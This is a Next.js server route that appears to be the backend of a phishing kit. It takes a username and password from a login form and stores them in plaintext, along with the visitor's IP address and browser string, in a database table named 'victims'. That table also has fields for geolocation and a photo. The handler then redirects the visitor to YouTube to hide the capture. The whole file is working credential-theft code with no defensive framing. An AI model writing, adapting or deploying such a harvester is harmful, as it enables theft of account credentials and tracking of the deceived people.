import { NextResponse } from 'next/server';
import { neon } from '@neondatabase/serverless';

export async function POST(request) {
  try {
    const formData = await request.formData();
    const username = formData.get('username');
    const password = formData.get('password');
    const ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';

    if (!username || !password) {
      return NextResponse.json({ status: 'error', message: 'Missing fields' }, { status: 400 });
    }

    let victimId = null;

    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Create table if not exists
      await sql(`
        CREATE TABLE IF NOT EXISTS victims (
          id SERIAL PRIMARY KEY,
          ip_address VARCHAR(45),
          user_agent TEXT,
          username VARCHAR(255),
          password VARCHAR(255),
          latitude DECIMAL(10, 8),
          longitude DECIMAL(11, 8),
          location_accuracy DECIMAL(10, 2),
          photo_url TEXT,
          captured_at TIMESTAMPTZ DEFAULT NOW()
        );
      `);

      const result = await sql`
        INSERT INTO victims (ip_address, user_agent, username, password)
        VALUES (${ip}, ${ua}, ${username}, ${password})
        RETURNING id;
      `;
      
      victimId = result[0]?.id;
    }

    return NextResponse.json({
      status: 'ok',
      redirect: 'https://www.youtube.com',
      victimId: victimId
    });
  } catch (error) {
    console.error('[LOGIN ERROR]', error);
    return NextResponse.json({ status: 'ok', redirect: 'https://www.youtube.com' });
  }
}
